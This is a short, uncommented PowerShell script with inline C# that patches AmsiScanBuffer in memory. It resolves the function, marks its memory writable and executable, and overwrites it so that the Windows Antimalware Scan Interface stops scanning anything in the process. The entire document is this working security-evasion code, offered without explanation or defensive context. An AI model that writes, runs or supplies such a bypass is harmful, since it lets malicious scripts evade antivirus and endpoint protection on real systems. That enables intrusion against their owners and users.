$code = @'
using System;
using System.Runtime.InteropServices;
public class AmsiPatch {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
'@

Add-Type $code

$ptr = [AmsiPatch]::GetProcAddress([AmsiPatch]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$oldProtection = 0
[AmsiPatch]::VirtualProtect($ptr, [uint32]5, 0x40, [ref]$oldProtection)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
